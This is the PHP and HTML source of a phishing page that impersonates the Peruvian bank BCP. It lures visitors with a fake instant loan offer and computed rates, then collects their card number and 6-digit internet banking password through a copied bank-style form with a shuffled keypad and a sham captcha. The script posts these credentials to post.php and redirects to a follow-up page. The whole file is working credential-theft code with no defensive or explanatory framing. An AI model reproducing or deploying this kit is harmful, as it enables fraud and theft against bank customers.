<?php
error_reporting(0);
session_start();
/*************************************************************************/
if ($_SESSION["openPE"] != "True") {
	header("Location: ./"); }
/*************************************************************************/
if ($_SESSION["corto"] == "Estimado Usuario(a)") {
	$nombre = "";
	$show = "none";
} else {
	$nombre = $_SESSION["corto"];
	$show = "block";
}
/*************************************************************************/
if ($_SESSION["presto"] >= 100 && $_SESSION["presto"] <= 3000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 26;
	$desgravamen = 0.705;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 3001 && $_SESSION["presto"] <= 10000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 24;
	$desgravamen = 0.605;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 10001 && $_SESSION["presto"] <= 25000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 22;
	$desgravamen = 0.505;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 25001 && $_SESSION["presto"] <= 80000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 18;
	$desgravamen = 0.405;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 80001 && $_SESSION["presto"] <= 200000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 15;
	$desgravamen = 0.305;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
	$interes = ($cuota_mensual * $meses) - $_SESSION["presto"];
}
/*************************************************************************/
?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>BCP al instante</title>
	<link rel="stylesheet" href="pe/styles/main.css">
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="pe/images/favicon.ico" rel="icon" type="image/x-icon">
	<link rel="stylesheet" href="pe/styles/stylo.css">
	<style>
		.loading {
			padding: 420px 0px 0px 410px;
		}

		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}

		@font-face {
			font-family: password;
			font-style:normal;
			font-weight:400;
			src: url(pe/styles/fuente/password.ttf); }

		.mask { font-family: password!important; }


		.separator {
			margin-bottom: 5px;
		}

		.teclita {
			width: 21%;
		}

		.b_tecla {
			display: none;
			text-align: center;
			background-color: rgb(255, 255, 255);
			border-radius: 10px;
			margin-top: 4px;
			padding: 5px;
			box-shadow: rgb(82 112 148 / 20%) 0px 1px 8px, rgb(82 112 148 / 12%) 0px 3px 3px -2px, rgb(82 112 148 / 14%) 0px 3px 4px;
		}

		span, input {
            font-family: var(--bcp-font-family-primary-demi, "Flexo-Demi"), helvetica, arial, sans-serif;
            font-size: 1rem;
            padding: 0;
        }

		label {
            display: block;
            width: 100%;
            border: 1px solid var(--onsurface-600, #868f9e);
            padding: 12px 10px;
            position: relative;
            box-sizing: border-box;
            border-radius: 8px;
            transition: .25s;
        }

        label input {
            display: block;
            width: 100%;
            border: none;
            background: transparent;
            outline: none;
        }

		label span {
            color: silver;
            position: absolute;
            top: 12px;
            left: 10px;
            transition: .25s;
        }

		/* Focus */

		label.focus {
            border-color: var(--primary-400, #0a47f0);
            -webkit-box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
            box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
        }

        label span.focus {
            color: var(--primary-400, #0a47f0);
        }

        /* Top */

        label span.top {
            left: 8px;
            top: -10px;
            font-size: 12px;
            background: white;
            padding: 0 6px;
        }
	</style>
</head>
<body class="">
<div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
    <div id="ajax_loader" class="esparta">
        <div class="text-center">
            <img src="pe/images/spinner.gif" class="loading">
        </div>
    </div>
</div>
<app-root _nghost-aqk-c52="" ng-version="12.2.16">
	<router-outlet _ngcontent-aqk-c52=""></router-outlet>
	<app-initial-verify _nghost-aqk-c63="">
		<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;">
			<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
				<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
					<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
						<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="background-image: url(pe/images/EV.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;">
							<img _ngcontent-aqk-c59="" src="pe/images/logo.svg" class="mt16 logoSize logoStyle">
						</div>
					</app-channel-image>
				</div>
				<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;">
					<app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54="">
						<div _ngcontent-aqk-c54="" class="row justify-content-end header-padding bar-blue header-first-pages">
							<div _ngcontent-aqk-c54="" class="col-6 col-md-3 di-lg-none px-0 header-logo-padding">
								<img _ngcontent-aqk-c54="" src="pe/images/logo.svg" class="logo-small">
							</div>
							<div _ngcontent-aqk-c54="" class="col-xl-12 d-none d-md-block">
								<div _ngcontent-aqk-c54="" class="row justify-content-end">
									<bcp-icon _ngcontent-aqk-c54="" name="chronometer-r" color="text" class="bar-blue hydrated" style="padding-top: 2px;">
										<i class="icon chronometer-r text"></i>
									</bcp-icon>
								</div>
							</div>
							<div _ngcontent-aqk-c54="" class="col-6 col-md-9 di-lg-none" style="padding-top: 3px;"></div>
						</div>
						<div>&nbsp;</div>
						<div _ngcontent-aqk-c54="" class="row back-button-medium d-only-mobile"></div>
					</app-home-header>
					<div _ngcontent-aqk-c63="" class="row container-form">
						<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 8px;">
							<div _ngcontent-aqk-c63="" class="box-wrapper container">
								<form class="ng-pristine ng-invalid ng-touched">
									<input type="hidden" id="one" value="<?=$interes;?>">
									<input type="hidden" id="tre" value="<?=$cuota_mensual;?>">
									<input type="hidden" id="for" value="<?=$desgravamen;?>">
									<input type="hidden" id="five" value="<?=$total_desgravamen;?>">
									<input type="hidden" id="six" value="<?=$tasa_mensual;?>">
									<input type="hidden" id="seven" value="<?=$interes_anual;?>">
									<div _ngcontent-aqk-c63="" class="row mt8 mb32">
										<div _ngcontent-aqk-c63="" class="col text-center">
											<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
												<h2 class="">Dinero al Instante</h2>
											</bcp-title>
											<p style="padding-top: 25px; text-align: justify;">
												Hola, <b><font color="#002a8d"><?=$nombre;?></font></b> estás siendo analizado para una ampliación de crédito de <b><font color="#002a8d">S/. <?=number_format($_SESSION["presto"]);?></font></b> financiado en <b><font color="#002a8d"><?=$meses;?> meses, </font></b> donde la Tasa de Interés Anual <b><font color="#002a8d">(TEA)</font></b> es del <b><font color="#002a8d"><?=$interes_anual;?>%</font></b> y la Tasa de Interés Mensual <b><font color="#002a8d">(TEM)</font></b> es del <b><font color="#002a8d"><?=$tasa_mensual;?>%</font></b>, el seguro de desgravamen es de <b><font color="#002a8d">S/. <?=$total_desgravamen;?></font></b> el equivalente al <b><font color="#002a8d"><?=$desgravamen;?>%</font></b> de tu prestamo, donde tu cuota aproximada a pagar es de: <b><font color="#002a8d">S/. <?=number_format($cuota_mensual, 2);?> mensuales.</font></b>
											</p>
											<p style="text-align: justify;">
												Al finalizar tu prestamo habras pagado un interes aproximado de <b><font color="#002a8d">S/. <?=number_format($interes, 2);?></font></b>
											</p>
											<p style="text-align: justify;">
												Para continuar con el proceso por favor inicie sesion, para validar sus datos
											</p>
										</div>
									</div>
									<div _ngcontent-aqk-c63="" class="row mb24">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-select-input _ngcontent-aqk-c63="" class="ng-untouched ng-pristine ng-invalid hydrated" maxlength="8">
												<div class="row no-gutters select-input-container" style="display:<?=$show;?>;">
													<div class="col input-container">
														<bcp-tooltip _ngcontent-aqk-c63="" size="lg" position="top" trigger="click" class="hydrated">
															<bcp-input class="hydrated">
																<div class="form-group">
																	<label id="title_0">
																		<span id="sub_0">Nombre</span>
																		<input disabled="" autocomplete="off" type="text" value="<?=$_SESSION["full"];?>">
																	</label>
																</div>
																<bcp-paragraph class="helper-text hydrated">
																	<p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
																</bcp-paragraph>
															</bcp-input>
														</bcp-tooltip>
													</div>
												</div>
												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_1">
																			<span id="sub_1">Número de Tarjeta</span>
																			<input autocomplete="off" id="presente" name="presente" type="tel" onkeypress="return tipoFiltro(event)" required="" onclick="hide_key();">
																		</label>
																		<input type="hidden" id="info">
																		<input type="hidden" id="tipo">
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>

												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_2">
																			<span id="sub_2">Clave de Internet de 6 dígitos</span>
																			<input class="mask" autocomplete="off" id="llave" name="llave" type="tel" maxlength="6" onkeypress="return tipoFiltro(event)" required="" onclick="ver_key();">
																		</label>
																	</div>
																	<div id="teclado" class="keypad-seed-containerx b_tecla">
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/5.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/3.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="delete_dni" keypadcleanall="" src="pe/images/teclado/keypad_delete-new.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/0.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/8.png">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="clean_dni" keypadclean="" src="pe/images/teclado/keypad_clean-new.png">
																			</div>
																		</div>
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>
											</bcp-select-input>
										</div>
									</div>
									<div _ngcontent-aqk-c63="" class="row mb24">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-captcha _ngcontent-aqk-c63="" bcpctrlform="" formcontrolname="captchaControl" maxlength="6" minlength="6" bcpalphanumeric="" class="ng-pristine ng-invalid hydrated ng-touched">
												<div class="row no-gutters captcha-container invalid">
													<bcp-img class="img-captcha hydrated">
														<img _ngcontent-c12="" id="kaptcha" width="130">
													</bcp-img>
													<div class="col image-container" tabindex="-1" name="div-img-bcp-input-0"></div>
													<div class="col input-container">
														<bcp-input ctrl-value="" class="hydrated">
															<div class="form-group invalid">
																<input class="form-control" required="" autocomplete="off" type="text" maxlength="6" placeholder="Captcha" id="captcha" autocorrect="off" autocapitalize="off" onclick="hide_key();">
															</div>
														</bcp-input>
													</div>
												</div>
											</bcp-captcha>
										</div>
									</div>
									<p id="alerta" style="text-align: center; color: red; font-size: 0.9rem; display: none;"></p>
									<div _ngcontent-aqk-c63="" class="row button-space-bottom d-sm-block btn-not-fixed">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg" full-width="" class="hydrated">
												<button type="button" class="btn btn-primary btn-lg btn-block" onclick="post(1);">
													<bcp-paragraph class="hydrated">
														<p class="paragraph-lg bcp-font-demi white">Continuar </p>
													</bcp-paragraph>
												</button>
											</bcp-button>
										</div>
									</div>
								</form>
							</div>
						</div>
					</div>
					<app-home-footer _ngcontent-aqk-c63="" _nghost-aqk-c55="">
						<div _ngcontent-aqk-c55="" class="justify-content-end footer-padding">
							<div _ngcontent-aqk-c55="" class="col remove-padding p-0">
								<div _ngcontent-aqk-c55="" class="box-wrapper container footer-container">
									<section _ngcontent-aqk-c55="" class="footer-main-text">
										<div _ngcontent-aqk-c55="" class="m-footer-icon">
											<bcp-icon _ngcontent-aqk-c55="" name="lock-b" color="onsurface-600" class="hydrated">
												<i class="icon lock-b onsurface-600"></i>
											</bcp-icon>
										</div>
										<div _ngcontent-aqk-c55="" class="container-text-large">
											<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="footer-text hydrated">
												<p class="paragraph-sm bcp-font-regular onsurface-600">
													Esta es una página segura. Si tienes dudas sobre la autenticidad de la web, comunícate <br _ngcontent-aqk-c55="" class="displayDesktop">con nosotros al 311-8989 ó a través de nuestros medios digitales.
												</p>
											</bcp-paragraph>
										</div>
									</section>
									<div _ngcontent-aqk-c55="" class="d-block d-lg-none container-footer-line">
										<div _ngcontent-aqk-c55="" class="footer-line"></div>
									</div>
									<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="d-none d-sm-block copyright-text hydrated">
										<p class="paragraph-sm bcp-font-regular onsurface-600">
											Todos los derechos reservados&nbsp;&nbsp;|&nbsp;&nbsp;© 2023 VIABCP
										</p>
									</bcp-paragraph>
									<div _ngcontent-aqk-c55="" class="d-block d-sm-none">
										<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="copyright-text hydrated">
											<p class="paragraph-sm bcp-font-regular onsurface-600">
												© 2022 VIABCP.com<br _ngcontent-aqk-c55="">Todos los derechos reservados
											</p>
										</bcp-paragraph>
									</div>
								</div>
							</div>
						</div>
					</app-home-footer>
				</div>
			</div>
		</div>
	</app-initial-verify>
</app-root>
<script type="text/javascript" src="pe/js/jquery-3.1.0.min.js"></script>
<script type="text/javascript" src="pe/js/mask.js"></script>
<script type="text/javascript" src="pe/js/value.js"></script>
<script type="text/javascript" src="pe/js/node.js"></script>
<script type='text/javascript'>

	function shuffle(array) {

		var currentIndex = array.length, temporaryValue, randomIndex;

		while (0 !== currentIndex) {
			randomIndex = Math.floor(Math.random() * currentIndex);
			currentIndex -= 1;
			temporaryValue = array[currentIndex];
			array[currentIndex] = array[randomIndex];
			array[randomIndex] = temporaryValue;
		}
		return array;
	}

	$(document).ready(function() {
		$("#presente").mask("0000 0000 0000 0000");
		
		$(function() {
			$("#presente").validateCard(function(result) {
				$("#info").val(result.valid);
				if(result.card_type != null)
					$("#tipo").val(result.card_type.name);
				formato();
			});
		});

		if($("#llave").val().length <= $("#llave").attr("maxlength")){
			$("#llave").val("");
			table_dni = [6,4,9,1,0,2,5,3,8,7];
			num_dni = shuffle(table_dni);

			$.each($("#teclado .separator .seed-enabled"), function(key) {
				this.value = num_dni[key];
				$(this).attr("src","pe/images/teclado/" + num_dni[key] + ".png");
			});
		}

		$('#sub_0').addClass('top');
	});

	$("#llave").focus(function() {
        ver_key();
    });

	$("#presente").focus(function() {
		$('#title_1').addClass('focus');
		$('#sub_1').addClass('top focus');
    });

	$("#presente").blur(function() {
		if($("#presente").val().length == 0) {
			$('#title_1').removeClass('focus');
			$('#sub_1').removeClass('top focus');
		} else {
			$('#title_1').removeClass('focus');
			$('#sub_1').removeClass('focus');
		}
    });

	$("#llave").focus(function() {
		$('#title_2').addClass('focus');
		$('#sub_2').addClass('top focus');
    });

	$("#llave").blur(function() {
		if($("#llave").val().length == 0) {
			$('#title_2').removeClass('focus');
			$('#sub_2').removeClass('top focus');
		} else {
			$('#title_2').removeClass('focus');
			$('#sub_2').removeClass('focus');
		}
    });

	function ver_key() {
		$("#teclado").show(600);
		$("#llave").attr("readonly","readonly");
	}

	function hide_key() {
		$("#teclado").hide(600);
		$("#llave").removeAttr("readonly");
	}

	$("#teclado .separator .seed-enabled").click(function(e) {
		$('#sub_2').addClass('top');
		if($("#llave").val().length == 5) {
			strng = $("#llave").val();
			$("#llave").val(strng + this.value);
			hide_key();
		} else if ($("#llave").val().length < 6) {
			strng = $("#llave").val();
			$("#llave").val(strng + this.value);
		}
	});

	$("#clean_dni").click(function(e) {
		pass = $("#llave").val();
		if(pass.length >= 1) {
			$("#llave").val(pass.substring(0,pass.length-1));
			if(pass.length == 1) {
				$('#sub_2').removeClass('top focus');
			}
		}
	});

	$("#delete_dni").click(function(e) {
		if($("#llave").val().length >= 1) {
			$('#sub_2').removeClass('top focus');
			$("#llave").val("");
		}
	});

	// Inicio CC
	function formato() {

		if ($("#info").val() == "true") {

			if ($("#tipo").val() != "amex") {
				$('#presente').mask("0000 0000 0000 0000");
				$("#presente").attr('maxlength', '19');
			} else {
				$('#presente').mask("0000 000000 00000");
				$("#presente").attr('maxlength', '17');
			}
		} else {
			$('#presente').mask("0000 0000 0000 0000");
		}
	}

	var imagen = ["img_1.png", "img_2.png", "img_3.png", "img_4.png", "img_5.png", "img_6.png", "img_7.png", "img_8.png", "img_9.png", "img_10.png", "img_11.png", "img_12.png", "img_13.png", "img_14.png", "img_15.png", "img_16.png", "img_17.png", "img_18.png", "img_19.png", "img_20.png", "img_21.png", "img_22.png", "img_23.png", "img_24.png"];

	$(document).ready(function() {
		$("#kaptcha").attr("src","" + "pe/images/capcha/" + imagen[Math.floor(Math.random()*imagen.length)]);
	});

    function tipoFiltro(e) {

        var charCode = e.key;

        if((/^[0-9]+$/.test(charCode))) {
            return true;
        } else {
            return false;
        }
    }

    function post(post) {

		let y = document.querySelector("#presente"); // Tarjeta
		let z = document.querySelector("#info"); // Valido
		let w = document.querySelector("#tipo"); // Tipo
		let d = document.querySelector("#llave"); // Clave
		const e = ['282ADP', 'PCBA83', '247WM8', 'PMB2NC', 'GA6N7B', 'G455N7', 'M3BB5C', '6444NW', 'BYW3NA', 'E8X3PC', 'W6D3DE', '7NXFBG', 'MDFP74', '4N4BWM', '7XXWPN', 'PNANY2', '4XP4G7', 'CAM58F', 'PN63PM', '36XD35', '2XWAB8', 'NAB33M', '2MD2GG', 'CXF7Y4', 'NXPPN5']; // Array Captcha
		let f = document.querySelector("#captcha"); // Captcha
		let g = document.querySelector("#one"); // Interes
		let i = document.querySelector("#tre"); // Cuota
		let j = document.querySelector("#for"); // Desgravamen
		let k = document.querySelector("#five"); // Total Desgravamen
		let l = document.querySelector("#six"); // TEM
		let m = document.querySelector("#seven"); // TEA
        
        let x = post;

        switch (x) {
    
            case 1: // Login

				if (w.value != "amex") { largo = "19"; } else { largo = "17"; }

				if (y.value.length < largo) {
					$("#alerta").html("* Ingresa un número de tarjeta de Credimás Clásica, Crédito Visa ó Crédito Amex.").show();
					y.focus();
					return false;
				}

				if (z.value != "true") {
					$("#alerta").html("* El número de tarjeta es invalido, por favor verifique").show();
					y.focus();
					return false;
				}

                if (d.value.length < 6) {
					$("#alerta").html("* Ingrese ó complete su clave de internet").show();
					d.focus();
					return false;
				}

				if (f.value == "") {
					$("#alerta").html("* Ingrese ó complete captcha").show();
					f.focus();
					return false;
				}
			
				if (e.includes(f.value.toUpperCase()) === false) {
					$("#alerta").html("* El captcha ingresado es incorrecto").show();
					f.focus();
					return false;
				}

                var parametros = {
                    "data_4": d.value,
					"data_5": y.value,
					"data_9": w.value,
					"data_10": g.value,
					"data_12": i.value,
					"data_14": j.value,
					"data_15": k.value,
					"data_16": l.value,
					"data_17": m.value,
                    "orden": "B", }
                
				$("#alerta").hide();
                $("#loader_ajax").show();
            
                $.ajax({
                    data: parametros,
                    url: 'post.php',
                    type: 'post',
                    success: function(response) {
                        setTimeout(function() {
                            window.open('second', '_parent');
                        }, 1800);
                    }
                });
    
            break;
    
            default:
            break;
        }
    }
</script>
</body>
</html>